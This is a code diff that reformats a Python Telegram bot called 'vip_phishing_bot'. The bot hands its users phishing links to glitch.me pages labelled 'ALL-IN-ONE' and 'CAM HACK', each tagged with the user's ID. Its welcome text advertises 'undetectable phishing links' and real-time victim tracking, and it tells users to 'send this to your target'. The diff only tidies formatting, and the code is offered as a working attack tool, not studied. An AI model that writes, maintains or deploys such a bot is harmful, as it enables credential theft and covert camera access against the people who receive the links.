@@ -15,19 +15,18 @@ app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT
 @app.on_message(filters.private & filters.command("start"))
 async def start_command(client, message):
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
-         InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")]
+        [
+            InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
+            InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")
+        ]
     ])
-    
+
     welcome_text = (
-        "🔰 <b>Welcome to the Ultimate Phishing Bot!</b> 🔰\n\n"
-        
-        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
-        
-        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
-        
-        "🛑 <b>Warning: High Security System Activated</b> 🛑\n\n"
-        "⚠️ <i>Use responsibly! Any misuse is your own responsibility.</i> ⚠️"
+        "<b><font face='Arial Black'>🔰 Welcome to the Ultimate Phishing Bot! 🔰</font></b>\n\n"
+        "<font face='Comic Sans MS'>🔥 Generate undetectable phishing links in seconds & send them to your targets!</font>\n"
+        "<font face='Comic Sans MS'>🎯 Track victims in real-time & collect data effortlessly.</font>\n\n"
+        "<b><font face='Arial Black'>🛑 Warning: High Security System Activated 🛑</font></b>\n\n"
+        "<i>⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️</i>"
     )
 
     await message.reply_text(welcome_text, reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)
@@ -58,25 +57,23 @@ async def callback_handler(client, callback_query):
             await asyncio.sleep(0.1)
             await loading_message.edit_text(stage)
 
-        await asyncio.sleep(0.1)  # Short pause before deleting the loading message
+        await asyncio.sleep(0.1)
         await loading_message.delete()
 
         # 📝 Send the Generated Link with Copy Button
-message_text = (
-    f"🛠 <b>Page Name:</b> <code>{page_name}</code>\n"
-    
-    f"🔗 <b>Link:</b> <a href='{link}'>Click Here</a>\n\n"
-    
-    f"🎯 Just send this to your target!"
-)
+        message_text = (
+            f"<b><font face='Arial Black'>🛠 Page Name:</font></b> <code>{page_name}</code>\n"
+            f"<b><font face='Arial Black'>🔗 Link:</font></b> <a href='{link}'>Click Here</a>\n\n"
+            "<font face='Comic Sans MS'>🎯 Just send this to your target!</font>"
+        )
 
-copy_button = InlineKeyboardMarkup([
-    [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
-])
+        copy_button = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
+        ])
 
-await callback_query.message.reply_text(
-    message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
-)
+        await callback_query.message.reply_text(
+            message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
+        )
     else:
         await callback_query.answer("❌ Invalid selection!", show_alert=True)
 
@@ -84,9 +81,9 @@ await callback_query.message.reply_text(
 @app.on_callback_query(filters.regex("^copy_"))
 async def copy_link_handler(client, callback_query):
     try:
-        _, user_id, data = callback_query.data.split("_", 2)  # Extract user_id and data
-        user_id = int(user_id)  # Convert user_id back to integer
-        
+        _, user_id, data = callback_query.data.split("_", 2)
+        user_id = int(user_id)
+
         links = {
             "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
             "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
